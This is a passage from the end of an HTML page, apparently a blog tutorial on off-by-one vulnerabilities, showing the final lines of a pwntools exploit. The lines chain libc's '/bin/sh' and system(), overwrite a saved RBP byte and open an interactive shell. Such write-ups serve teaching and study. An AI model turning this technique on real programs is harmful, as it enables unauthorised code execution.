payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token string">'AAAAAAAA\x00'</span>                                <span class="token comment"># Use off-by-one vuln to overwrite least significant byte of the saved RBP with 0x00, shifting code executin to our buffer.</span>
bof<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div></div>
      </div></div>

  
  
<div class="pagination">
    <div class="pagination__title">
        <span class="pagination__title-h">Read other posts</span>
        <hr>
    </div>
    <div class="pagination__buttons">
        
        
        <span class="button next">
            <a href="http://localhost:1313/posts/off-by-one/">
                <span class="button__text">Off-by-One Vulnerabilities</span>
                <span class="button__icon">→</span>
            </a>
        </span>
        
    </div>
</div>

  

  
  

  
</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="http://localhost:1313/assets/main.js"></script>
<script src="http://localhost:1313/assets/prism.js"></script>







  
</div>



</body></html>
```